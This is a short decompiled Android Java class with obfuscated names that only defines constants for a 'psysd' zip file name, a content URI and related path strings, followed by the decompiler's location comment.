package com.fx.psysd.ref;

import android.net.Uri;
import com.vvt.m.b;
import com.vvt.shell.f;

public class a
{
  public static final String a;
  public static final String b;
  public static final String[] c;
  public static final String d;
  public static final String e;
  public static final Uri f = Uri.parse("content://com.fx.psysd/startup_finish");
  
  static
  {
    int i = 1;
    Object localObject = new Object[i];
    localObject[0] = "psysd";
    a = String.format("%s.zip", (Object[])localObject);
    b = b.c;
    String[] arrayOfString = new String[i];
    localObject = f.a;
    arrayOfString[0] = localObject;
    c = arrayOfString;
    d = b.c;
    localObject = new Object[2];
    String str = b.c;
    localObject[0] = str;
    localObject[i] = "psysd";
    e = String.format("%s/%s", (Object[])localObject);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/fx/psysd/ref/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */